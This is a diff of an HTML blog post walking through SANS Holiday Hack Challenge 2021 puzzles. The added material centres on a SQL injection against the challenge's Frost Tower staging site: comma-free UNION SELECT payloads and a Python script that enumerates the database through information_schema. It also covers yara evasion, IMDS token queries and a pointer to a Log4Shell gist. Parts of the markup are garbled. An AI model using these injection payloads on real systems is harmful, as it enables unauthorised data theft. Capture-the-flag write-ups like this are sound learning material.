@@ -218,51 +218,14 @@
 <a href="#12-frost-tower-website-checkup">12 Frost Tower Website Checkup</a>
 <ul>
 <li class="toc-entry toc-h3"><a href="#circumvent-the-session-protection">Circumvent the session protection</a></li>
-<li class="toc-entry toc-h3"><a href="#exploit-an-sql-injection-vulnerability">Exploit an SQL injection vulnerability</a></li>
-</ul>
-</li>
-</ul>
-</li>
-<li class="toc-entry toc-h1">
-<a href="#achievements">Achievements</a>
+<li class="toc-entry toc-h3">
+<a href="#exploit-an-sql-injection-vulnerability">Exploit an SQL injection vulnerability</a>
 <ul>
-<li class="toc-entry toc-h2"><a href="#logic-munchers">Logic munchers</a></li>
-<li class="toc-entry toc-h2">
-<a href="#greeping-for-gold">Greeping for gold</a>
-<ul>
-<li class="toc-entry toc-h3"><a href="#level-1-2">Level 1</a></li>
-<li class="toc-entry toc-h3"><a href="#level-2-2">Level 2</a></li>
-<li class="toc-entry toc-h3"><a href="#level-3-2">Level 3</a></li>
-<li class="toc-entry toc-h3"><a href="#level-4-2">Level 4</a></li>
-<li class="toc-entry toc-h3"><a href="#level-5-2">Level 5</a></li>
-<li class="toc-entry toc-h3"><a href="#level-6-2">Level 6</a></li>
+<li class="toc-entry toc-h4"><a href="#find-the-sql-injection">Find the SQL injection</a></li>
 </ul>
 </li>
-<li class="toc-entry toc-h2"><a href="#strace-lctrace-retrace">strace lctrace retrace</a></li>
-<li class="toc-entry toc-h2"><a href="#yara-analysis">yara analysis</a></li>
-<li class="toc-entry toc-h2"><a href="#ipv6-sandbox">IPv6 Sandbox</a></li>
-<li class="toc-entry toc-h2">
-<a href="#elf-code-python">Elf code Python</a>
-<ul>
-<li class="toc-entry toc-h3"><a href="#level-1-3">Level 1</a></li>
-<li class="toc-entry toc-h3"><a href="#level-2-3">Level 2</a></li>
-<li class="toc-entry toc-h3"><a href="#level-3-3">Level 3</a></li>
-<li class="toc-entry toc-h3"><a href="#level-4-3">Level 4</a></li>
-<li class="toc-entry toc-h3"><a href="#level-5-3">Level 5</a></li>
-<li class="toc-entry toc-h3"><a href="#level-6-3">Level 6</a></li>
-<li class="toc-entry toc-h3"><a href="#level-7-2">Level 7</a></li>
-<li class="toc-entry toc-h3"><a href="#level-8-2">Level 8</a></li>
-<li class="toc-entry toc-h3"><a href="#level-9-1">Level 9</a></li>
-<li class="toc-entry toc-h3"><a href="#level-10-1">Level 10</a></li>
 </ul>
 </li>
-<li class="toc-entry toc-h2"><a href="#document-analysis-exiftool-metadata">Document Analysis Exiftool Metadata</a></li>
-<li class="toc-entry toc-h2"><a href="#frostavator">Frostavator</a></li>
-<li class="toc-entry toc-h2"><a href="#hoho-no-fail2ban">Hoho No Fail2ban</a></li>
-<li class="toc-entry toc-h2"><a href="#santas-holiday-hero">Santas Holiday Hero</a></li>
-<li class="toc-entry toc-h2"><a href="#bonus-blue-log4jack">Bonus Blue Log4jack</a></li>
-<li class="toc-entry toc-h2"><a href="#bonus-red-log4jack">Bonus Red Log4jack</a></li>
-<li class="toc-entry toc-h2"><a href="#imds-exploration">IMDS Exploration</a></li>
 </ul>
 </li>
 </ul>
@@ -1705,7 +1668,7 @@ Who knows? Maybe you’ll even find more than one vulnerability in the code.</p>
 
 <p>If you look into the code <code class="language-plaintext highlighter-rouge">server.js</code> you can find:</p>
 
-<p><img src="/blog/assets/img/hhc/2021/12_postcontact_session_error.png" width="100%" alt="Postcontact Session Error"></p>
+<p><img src="/blog/assets/img/hhc/2021/12_0005_postcontact_session_error.png" width="100%" alt="Postcontact Session Error"></p>
 
 <p>So you will get a valid session cookie if you enter an e-mail address twice in this form. To do this goto <a href="https://staging.jackfrosttower.com/contact" target="_blank" rel="noopener noreferrer">https://staging.jackfrosttower.com/contact</a></p>
 
@@ -1720,9 +1683,93 @@ Who knows? Maybe you’ll even find more than one vulnerability in the code.</p>
 <h3 id="exploit-an-sql-injection-vulnerability">
 <a class="anchor" href="#exploit-an-sql-injection-vulnerability" aria-hidden="true"><span class="octicon octicon-link"></span></a>Exploit an SQL injection vulnerability</h3>
 
-<p>The vulnerable code is in the details page.</p>
+<h4 id="find-the-sql-injection">
+<a class="anchor" href="#find-the-sql-injection" aria-hidden="true"><span class="octicon octicon-link"></span></a>Find the SQL injection</h4>
 
-<p>To get all tables in the database you can use</p>
+<p>The vulnerable code is in the details page. Inspecting the code you can see a usage of a suspicious raw function which goes into a concatenated sql query:</p>
+
+<p><img src="/blog/assets/img/hhc/2021/12_0020_details_api_code.png" width="100%" alt="Details api Code 1"></p>
+
+<p>and finally spits out data:</p>
+
+<p><img src="/blog/assets/img/hhc/2021/12_0025_details_api_code.png" width="100%" alt="details api code 2"></p>
+
+<p>The raw function is described in the <a href="https://github.com/mysqljs/mysql#escaping-query-values" target="_blank" rel="noopener noreferrer">node mysql documentation</a>:</p>
+
+<p><img src="/blog/assets/img/hhc/2021/12_0030_node_mysql_documentation_raw.png" width="100%" alt="node mysql documentation raw"></p>
+
+<p>So since no escaping is taking place here and the sql query is concatenated you should be able to inject sql in between the commas.</p>
+
+<p>This is also underlined by the reference in Jack’s Rest Room when you pull the trigger from the toilet.</p>
+
+<p><img src="/blog/assets/img/hhc/2021/12_0040_hint_jacks_restroom.png" width="100%" alt="hint jacks rest room"></p>
+
+<p>The sql query looks something like this if you deliver 2 values:</p>
+
+<pre><code class="mysql">SELECT * FROM uniquecontact WHERE id=" +ids[0]+ " OR id=" +ids[1]+ " OR id=?"
+</code></pre>
+<p>where ? will be “0”.</p>
+
+<p>e.g. “1,2”:</p>
+
+<pre><code class="mysql">SELECT * FROM uniquecontact WHERE id=1 OR id=2 OR id=?"
+</code></pre>
+<p>with ? = 0.</p>
+
+<p>For a fast test you can use:</p>
+
+<pre><code class="mysql">1,2 OR TRUE -- 
+</code></pre>
+<p>(beware of the space after the two dashes)</p>
+
+<p>vs</p>
+
+<pre><code class="mysql">1,2 AND FALSE -- 
+</code></pre>
+
+<p>One results in <em>all</em> entries of the table <code class="language-plaintext highlighter-rouge">uniquecontact</code>. The other one in only one entry, namely the first.</p>
+
+<p>You can evaluate these commands directly on the database if you run:</p>
+
+<pre><code class="bash">run -it --rm --name mysql -e MYSQL_ROOT_PASSWORD=secret -e MYSQL_USER=encontact -e MYSQL_PASSWORD=password -e MYSQL_DATABASE=encontact -d -p 127.0.0.1:3306:3306 mariadb:latest mysqld
+[sudo] Passwort für phoot1if: 
+<some docker="">
+deti <some docker=""> mysql  -uroot -psecret
+&lt;/code&gt;&lt;/pre&gt;
+
+Copy paste the content of `sql/encontact_db.sql` into the mysql console inside docker. After that you can run MYSQL commands directly at the database encontact.
+
+#### Find a UNION SELECT
+
+Next you want to iterate the database. In mysql you therefore have to get the table `information_schema`.
+So first it is necessary to find the number of columns from your current table `uniquecontact`. Looking inside the code 
+
+<img src="/blog/assets/img/hhc/2021/12_0050_uniquecontact_table" width="100%" alt="uniquecontact table">
+
+you can count 7 columns.
+
+A standard UNION SELECT would be like 
+
+<pre><code class="mysql">SELECT * FROM uniquecontact WHERE id=1 OR id=2 UNION SELECT 1,2,3,4,5,6,7 -- "
+</code></pre>
+
+but this doesn't work because we have no possibility to set commas as a payload.
+
+At this point googling revealed a nice workaround with <a href="https://blog.fireheart.in/a?ID=01550-bf20ddc3-4878-49cf-9c7a-7b09cc36609d" target="_blank" rel="noopener noreferrer">JOINS</a> resulting in the payload:
+
+<pre><code class="bash">1,2 UNION SELECT * FROM ((SELECT 1)A JOIN (SELECT 2)B JOIN (SELECT 3)C JOIN (SELECT 4)D JOIN (SELECT 5)E JOIN (SELECT 6)F JOIN (SELECT 7)G) -- 
+</code></pre>
+
+#### Enumerate tables and columns
+
+Now you can iterate the tables of database:
+
+<pre><code class="mysql">1,2 UNION SELECT * FROM ((SELECT 1)A JOIN (SELECT 2)B JOIN ( SELECT table_name FROM information_schema.tables limit 1 offset 0)C JOIN (SELECT 4)D JOIN (SELECT 5)E JOIN (SELECT 6)F JOIN (SELECT 7)G) --
+</code></pre>
+
+Increment counter after `OFFSET` to go further.
+
+To fetch all tables in the database you can use
 
 <pre><code class="python">#!/usr/bin/env python3
 import urllib
@@ -1760,69 +1807,111 @@ resp = s.post("https://staging.jackfrosttower.com/postcontact", allow_redirects=
 
 for i in range(0,100):
         try:
-                resp = s.get("https://staging.jackfrosttower.com/detail/1,2 UNION SELECT * FROM ((SELECT 1)A JOIN (SELECT 2)B JOIN ( SELECT table_name FROM information_schema. tables limit 1 offset "+str(i)+")C JOIN (SELECT 4)D JOIN (SELECT 5)E JOIN (SELECT 6)F JOIN (SELECT 7)G) -- ")
+                resp = s.get("https://staging.jackfrosttower.com/detail/1,2 UNION SELECT * FROM ((SELECT 1)A JOIN (SELECT 2)B JOIN ( SELECT table_name FROM information_schema.tables limit 1 offset "+str(i)+")C JOIN (SELECT 4)D JOIN (SELECT 5)E JOIN (SELECT 6)F JOIN (SELECT 7)G) -- ")
                 soup = BeautifulSoup(resp.text, 'lxml')
                 ul = soup.find_all("ul", {"class":"datadetail"})[2]
                 print(ul.li.string)
         except:
 </code></pre>
 
-<h1 id="achievements">
-<a class="anchor" href="#achievements" aria-hidden="true"><span class="octicon octicon-link"></span></a>Achievements</h1>
+Among the enumerated tables there is an interesting one that fits the original question
 
-<h2 id="logic-munchers">
-<a class="anchor" href="#logic-munchers" aria-hidden="true"><span class="octicon octicon-link"></span></a>Logic munchers</h2>
+<blockquote>In Jack Frost's TODO list, what job position does Jack plan to offer Santa?</blockquote>
 
-<p>Understand the boolean logic and play the mentioned level</p>
+<img src="/blog/assets/img/hhc/2021/12_0060_iteratetables.png" width="100%" alt="iterate tables">
 
-<h2 id="greeping-for-gold">
-<a class="anchor" href="#greeping-for-gold" aria-hidden="true"><span class="octicon octicon-link"></span></a>Greeping for gold</h2>
+To iterate the columns in this table use a similar approach:
 
-<h3 id="level-1-2">
-<a class="anchor" href="#level-1-2" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 1</h3>
+<pre><code class="mysql">1,2 UNION SELECT * FROM ((SELECT 1)A JOIN (SELECT 2)B JOIN ( SELECT column_name FROM information_schema.columns where table_name='todo' limit 1 offset 0)C JOIN (SELECT 4)D JOIN (SELECT 5)E JOIN (SELECT 6)F JOIN (SELECT 7)G) --
+</code></pre>
+
+and increment the value after `OFFSET`. You will get:
+
+<pre><code class="bash">id note completed
+</code></pre>   
+
+#### Exfiltrate
+
+Let look inside the columns of `note`:
+
+<pre><code class="mysql">1,2 UNION SELECT * FROM ((SELECT 1)A JOIN (SELECT 2)B JOIN ( SELECT note FROM todo where id=0)C JOIN (SELECT 4)D JOIN (SELECT 5)E JOIN (SELECT 6)F JOIN (SELECT 7)G) --
+</code></pre>
+
+Nothing.
+
+<pre><code class="mysql">1,2 UNION SELECT * FROM ((SELECT 1)A JOIN (SELECT 2)B JOIN ( SELECT note FROM todo where id=1)C JOIN (SELECT 4)D JOIN (SELECT 5)E JOIN (SELECT 6)F JOIN (SELECT 7)G) --
+</code></pre>
+
+<pre><code class="bash">Buy up land all around Santa's Castle
+</code></pre>
+
+id=2 :
+
+<pre><code class="bash">Build bigger and more majestic tower next to Santa's
+</code></pre>
+
+id=3..9:
+
+<pre><code class="bash">Erode Santa's influence at the North Pole via FrostFest, the greatest Con in history
+Dishearten Santa's elves and encourage defection to our cause
+Steal Santa's sleigh technology and build a competing and way better Frosty present delivery vehicle
+Undermine Santa's ability to deliver presents on 12/24 through elf staff shortages, technology glitches, and assorted mayhem
+Force Santa to cancel Christmas
+SAVE THE DAY by delivering Frosty presents using merch from the Frost Tower Gift Shop to children world-wide... so the whole world sees that Frost saved the Holiday Season!!!! Bwahahahahaha!
+With Santa defeated, offer the old man a job as a clerk in the Frost Tower Gift Shop so we can keep an eye on him
+</code></pre>
+
+So the solution is
+
+`clerk`
+
+# Achievements
+
+## Logic munchers
+
+Understand the boolean logic and play the mentioned level
+
+## Greeping for gold
+
+### Level 1
 
 <pre><code class="bash">grep '34.76.1.22' bigscan.gnmap
 Host: 34.76.1.22 ()     Status: Up
 Host: 34.76.1.22 ()     Ports: 62078/open/tcp//iphone-sync///      Ignored State: closed (999)
 </code></pre>
-<p>=&gt; 62078</p>
+=&gt; 62078
 
-<h3 id="level-2-2">
-<a class="anchor" href="#level-2-2" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 2</h3>
+### Level 2
 
 <pre><code class="bash">grep '34.77.207.226' bigscan.gnmap
 Host: 34.77.207.226 ()     Status: Up
 Host: 34.77.207.226 ()     Ports: 8080/open/tcp//http-proxy///      Ignored State: filtered (999)
 </code></pre>
 
-<p>=&gt; 8080</p>
+=&gt; 8080
 
-<h3 id="level-3-2">
-<a class="anchor" href="#level-3-2" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 3</h3>
+### Level 3
 
 <pre><code class="bash">grep 'Up' bigscan.gnmap | wc -l
 26054</code></pre>
 
-<p>=&gt; 26054</p>
+=&gt; 26054
 
-<h3 id="level-4-2">
-<a class="anchor" href="#level-4-2" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 4</h3>
+### Level 4
 
 <pre><code class="bash">grep -E '(\s80|\s443|\s8080)\/open' bigscan.gnmap | wc -l
 14372</code></pre>
 
-<p>=&gt; 14372</p>
+=&gt; 14372
 
-<h3 id="level-5-2">
-<a class="anchor" href="#level-5-2" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 5</h3>
+### Level 5
 
 <pre><code class="bash">echo $((`grep 'Up' -A 1 bigscan.gnmap | grep Up | wc -l` - `grep 'Up' -A 1 bigscan.gnmap | grep Port |  wc -l`))
 402</code></pre>
 
-<p>=&gt; 402</p>
+=&gt; 402
 
-<h3 id="level-6-2">
-<a class="anchor" href="#level-6-2" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 6</h3>
+### Level 6
 
 <pre><code class="bash">while read p; do out1=$(echo $p| cut -f 2 -d " ");out2=$(echo -n $p|grep -o "open"|wc -l); echo "$out1  $out2"; done &lt; &lt;(grep "Ports" bigscan.gnmap) &gt; ot</code></pre>
 
@@ -1838,10 +1927,9 @@ Host: 34.77.207.226 ()     Ports: 8080/open/tcp//http-proxy///      Ignored Stat
 34.79.22.38 12
 34.79.94.34 12</code></pre>
 
-<p>=&gt; 12</p>
+=&gt; 12
 
-<h2 id="strace-lctrace-retrace">
-<a class="anchor" href="#strace-lctrace-retrace" aria-hidden="true"><span class="octicon octicon-link"></span></a>strace lctrace retrace</h2>
+## strace lctrace retrace
 
 <pre><code class="bash">ls -&gt; file: "make the candy"
 ./make the candy -&gt; Unable to open configuration file
@@ -1853,21 +1941,19 @@ ltrace ./make the candy -&gt; strstr(":"b"}\n","True")
 echo '{"Registration":"True"}' &gt; registration.json
 </code></pre>
 
-<h2 id="yara-analysis">
-<a class="anchor" href="#yara-analysis" aria-hidden="true"><span class="octicon octicon-link"></span></a>yara analysis</h2>
+## yara analysis
 
-<p>Run the program “the_critical_elf_app” and look at the output: “yara_rule_135 ./the_critical_elf_app”
-yara_rule_135 has the condition “candycane” in the yara_rules folder.
+Run the program "the_critical_elf_app" and look at the output: "yara_rule_135 ./the_critical_elf_app"
+yara_rule_135 has the condition "candycane" in the yara_rules folder.
 So change this string using vim in the binary
-Next rule looks for hex at the end of the string “This is critical for the execution of this program!!”. 
+Next rule looks for hex at the end of the string "This is critical for the execution of this program!!". 
 Replace this too in the binary using vim.
 The rule 1732 has an and condition including the filesize. So cat the file as often together until it is larger than 50 KB.
-If the binary doesnt work after that, change the before mentioned values in all findings in the file.</p>
+If the binary doesnt work after that, change the before mentioned values in all findings in the file.
 
-<h2 id="ipv6-sandbox">
-<a class="anchor" href="#ipv6-sandbox" aria-hidden="true"><span class="octicon octicon-link"></span></a>IPv6 Sandbox</h2>
+## IPv6 Sandbox
 
-<p>First check normal IPv4 stuff:</p>
+First check normal IPv4 stuff:
 
 <pre><code>ip neigh -&gt; get arp and ndp  findings -&gt; 192.168.160.1, fe80::1, fe80::42:c0ff:fea8:a002
 nmap 192.168.160.1 -p- -&gt; 22,3000,8000 open
@@ -1882,18 +1968,15 @@ curl
 -&gt; curl --interface eth0 http://[fe80::42::c0ff:fea8:a002]:9000/
 "PieceOnEarth"
 </code></pre>
-<p>Place this string in the top terminal as solution</p>
+Place this string in the top terminal as solution
 
-<h2 id="elf-code-python">
-<a class="anchor" href="#elf-code-python" aria-hidden="true"><span class="octicon octicon-link"></span></a>Elf code Python</h2>
+## Elf code Python
 
-<h3 id="level-1-3">
-<a class="anchor" href="#level-1-3" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 1</h3>
+### Level 1
 
-<p>Just run the code</p>
+Just run the code
 
-<h3 id="level-2-3">
-<a class="anchor" href="#level-2-3" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 2</h3>
+### Level 2
 
 <pre><code class="python">import elf, munchkins, levers, lollipops, yeeters, pits
 elf.moveLeft(10)
@@ -1904,8 +1987,7 @@ elf.moveLeft(3)
 elf.moveUp(2)
 </code></pre>
 
-<h3 id="level-3-3">
-<a class="anchor" href="#level-3-3" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 3</h3>
+### Level 3
 
 <pre><code class="python">import elf, munchkins, levers, lollipops, yeeters, pits
 lever0 = levers.get(0)
@@ -1916,8 +1998,7 @@ elf.moveLeft(4)
 elf.moveUp(10)
 </code></pre>
 
-<h3 id="level-4-3">
-<a class="anchor" href="#level-4-3" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 4</h3>
+### Level 4
 
 <pre><code class="python">import elf, munchkins, levers, lollipops, yeeters, pits
 # Complete the code below:
@@ -1938,8 +2019,7 @@ lever0.pull({})
 elf.moveUp(2)
 </code></pre>
 
-<h3 id="level-5-3">
-<a class="anchor" href="#level-5-3" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 5</h3>
+### Level 5
 
 <pre><code class="python">import elf, munchkins, levers, lollipops, yeeters, pits
 # Fix/Complete Code below
@@ -1963,8 +2043,7 @@ lever0.pull(d)
 elf.moveUp(2)
 </code></pre>
 
-<h3 id="level-6-3">
-<a class="anchor" href="#level-6-3" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 6</h3>
+### Level 6
 
 <pre><code class="python">import elf, munchkins, levers, lollipops, yeeters, pits
 # Fix/Complete the below code
@@ -1983,8 +2062,7 @@ lever.pull(data)
 elf.moveUp(2)
 </code></pre>
 
-<h3 id="level-7-2">
-<a class="anchor" href="#level-7-2" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 7</h3>
+### Level 7
 
 <pre><code class="python">import elf, munchkins, levers, lollipops, yeeters, pits
 for num in range(5): #not sure if number is right
@@ -1995,8 +2073,7 @@ for num in range(5): #not sure if number is right
     elf.moveDown(12)
 </code></pre>
 
-<h3 id="level-8-2">
-<a class="anchor" href="#level-8-2" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 8</h3>
+### Level 8
 
 <pre><code class="python">import elf, munchkins, levers, lollipops, yeeters, pits
 all_lollipops = lollipops.get()
@@ -2011,8 +2088,7 @@ elf.moveDown(5)
 elf.moveTo({"x":2,"y":2})
 </code></pre>
 
-<h3 id="level-9-1">
-<a class="anchor" href="#level-9-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 9</h3>
+### Level 9
 
 <pre><code class="python">import elf, munchkins, levers, lollipops, yeeters, pits
 
@@ -2043,8 +2119,7 @@ munchkin.answer(func_to_pass_to_mucnhkin)
 elf.moveUp(1)
 </code></pre>
 
-<h3 id="level-10-1">
-<a class="anchor" href="#level-10-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 10</h3>
+### Level 10
 
 <pre><code class="python">import elf, munchkins, levers, lollipops, yeeters, pits
 import time
@@ -2061,50 +2136,52 @@ for index, mun in enumerate(muns):
 elf.moveTo({"x":2,"y":2})
 </code></pre>
 
-<h2 id="document-analysis-exiftool-metadata">
-<a class="anchor" href="#document-analysis-exiftool-metadata" aria-hidden="true"><span class="octicon octicon-link"></span></a>Document Analysis Exiftool Metadata</h2>
+## Document Analysis Exiftool Metadata
 
 <pre><code class="bash">exiftool * | grep "Jack Frost" -C 45 | grep "^File Name"</code></pre>
-<p>=&gt; 2021-12-21.docx</p>
+=&gt; 2021-12-21.docx
 
-<h2 id="frostavator">
-<a class="anchor" href="#frostavator" aria-hidden="true"><span class="octicon octicon-link"></span></a>Frostavator</h2>
+## Frostavator
 
 <pre><code>xor nor xnor
 and nand or
 </code></pre>
 
-<h2 id="hoho-no-fail2ban">
-<a class="anchor" href="#hoho-no-fail2ban" aria-hidden="true"><span class="octicon octicon-link"></span></a>Hoho No Fail2ban</h2>
+## Hoho No Fail2ban
 
-<p>Look into
-<code class="language-plaintext highlighter-rouge">cat /var/log/hohono.log</code> to get an overview</p>
+Look into
+`cat /var/log/hohono.log` to get an overview
 
-<p>PoC to find the regex which shouldnt be allowed:</p>
+PoC to find the regex which shouldnt be allowed:
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> cat /var/log/hohono.log  | grep -v successful | grep -v Valid | grep -v 'Invalid heartbeat' | grep -v   'rejected due to unknown user' | grep -v 'sent a malformed request' | grep -v 'Failed login'
+ ```
+ cat /var/log/hohono.log  | grep -v successful | grep -v Valid | grep -v 'Invalid heartbeat' | grep -v   'rejected due to unknown user' | grep -v 'sent a malformed request' | grep -v 'Failed login'
  root@3ee23184d155:~#
-</code></pre></div></div>
+ ```
 
-<p>vim /etc/fail2ban/filter.d/naughtylistservice.conf
-=&gt;</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/fail2ban/filter.d/naughtylistservice.conf
-[Definition]
-failregex = Invalid heartbeat '.*' from &lt;HOST&gt;
-Login from &lt;HOST&gt; rejected due to unknown user name
-&lt;HOST&gt; sent a malformed request
-Failed login from &lt;HOST&gt; for .*
-</code></pre></div></div>
-<p>vim /etc/fail2ban/action.d/naughtylistservice.conf
-=&gt;</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/fail2ban/action.d/naughtylistservice.conf
-[Definition]
-actionban = /root/naughtylist add &lt;ip&gt;
-</code></pre></div></div>
 
-<p>vim /etc/fail2ban/jail.d/naughtylistservice.conf
-=&gt;</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/fail2ban/jail.d/naughtylistservice.conf
+vim /etc/fail2ban/filter.d/naughtylistservice.conf
+=&gt;
+```
+cat /etc/fail2ban/filter.d/naughtylistservice.conf
+[Definition]
+failregex = Invalid heartbeat '.*' from <host>
+Login from <host> rejected due to unknown user name
+<host> sent a malformed request
+Failed login from <host> for .*
+```
+vim /etc/fail2ban/action.d/naughtylistservice.conf
+=&gt;
+```
+cat /etc/fail2ban/action.d/naughtylistservice.conf
+[Definition]
+actionban = /root/naughtylist add <ip>
+```
+
+vim /etc/fail2ban/jail.d/naughtylistservice.conf
+=&gt;
+```
+cat /etc/fail2ban/jail.d/naughtylistservice.conf
 # service name
 [naughtylistservice]
 # tune on / off
@@ -2118,23 +2195,21 @@ logpath = /var/log/hohono.log
 maxretry = 10
 findtime = 3600
 action = naughtylistservice
-</code></pre></div></div>
+```
 
-<p>service fail2ban restart
+service fail2ban restart
 fail2ban-client status
 fail2ban-client status naughtylistservice
-/root/naughtylist refresh</p>
+/root/naughtylist refresh
 
-<h2 id="santas-holiday-hero">
-<a class="anchor" href="#santas-holiday-hero" aria-hidden="true"><span class="octicon octicon-link"></span></a>Santas Holiday Hero</h2>
+## Santas Holiday Hero
 
-<p>Set cookie “HOHOHO” to “%7B%22single_player%22%%3Atrue%7D”
+Set cookie "HOHOHO" to "%7B%22single_player%22%%3Atrue%7D"
 Set a breakpoint at holidayhero.min.js:736
 Goto console and set single_player_mode=true
-=&gt; Play together with SYSTEM and win</p>
+=&gt; Play together with SYSTEM and win
 
-<h2 id="bonus-blue-log4jack">
-<a class="anchor" href="#bonus-blue-log4jack" aria-hidden="true"><span class="octicon octicon-link"></span></a>Bonus Blue Log4jack</h2>
+## Bonus Blue Log4jack
 
 <pre><code class="bash">-&gt; Y
 -&gt; ls
@@ -2177,13 +2252,12 @@ Goto console and set single_player_mode=true
 -&gt; next
 </code></pre>
 
-<h2 id="bonus-red-log4jack">
-<a class="anchor" href="#bonus-red-log4jack" aria-hidden="true"><span class="octicon octicon-link"></span></a>Bonus Red Log4jack</h2>
+## Bonus Red Log4jack
 
-<p>Follow all the steps in <a href="https://gist.github.com/joswr1ght/fb361f1f1e58307048aae5c0f38701e4" target="_blank" rel="noopener noreferrer">https://gist.github.com/joswr1ght/fb361f1f1e58307048aae5c0f38701e4</a> 
-and replace WEBSERVERIP, NETCATIP and MARSHALSECIP with your ip (<code class="language-plaintext highlighter-rouge">ip a</code>).</p>
+Follow all the steps in <a href="https://gist.github.com/joswr1ght/fb361f1f1e58307048aae5c0f38701e4" target="_blank" rel="noopener noreferrer">https://gist.github.com/joswr1ght/fb361f1f1e58307048aae5c0f38701e4</a> 
+and replace WEBSERVERIP, NETCATIP and MARSHALSECIP with your ip (`ip a`).
 
-<p>Answer text from <code class="language-plaintext highlighter-rouge">/home/solr/kringle.txt</code> is</p>
+Answer text from `/home/solr/kringle.txt` is
 <pre><code>"""
 The solution to Log4shell is patching
 Sincerely,
@@ -2192,13 +2266,12 @@ Santa
 """
 </code></pre>
 
-<p>So<br>
-“patching” is what you search.</p>
+So  
+"patching" is what you search.
 
-<h2 id="imds-exploration">
-<a class="anchor" href="#imds-exploration" aria-hidden="true"><span class="octicon octicon-link"></span></a>IMDS Exploration</h2>
+## IMDS Exploration
 
-<p>To start the challenge enter:</p>
+To start the challenge enter:
 
 <pre><code class="bash">Yes
 </code></pre>
@@ -2342,7 +2415,7 @@ TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metad
 variable TOKEN. Import it into your environment by running 'source gettoken.sh'.
 </code></pre>
 
-<p>I had to enter this twice:</p>
+I had to enter this twice:
 <pre><code class="bash">source gettoken.sh
 </code></pre>
 
@@ -2366,6 +2439,7 @@ http://169.254.169.254/latest/meta-data/placement/region'
 🍬🍬🍬🍬Congratulations!🍬🍬🍬🍬
 You've completed the lesson on Instance Metadata interaction. Run 'exit' to close.
 </code></pre>
+</ip></host></host></host></host></some></some></code></pre>
 
             </div>
         </div>
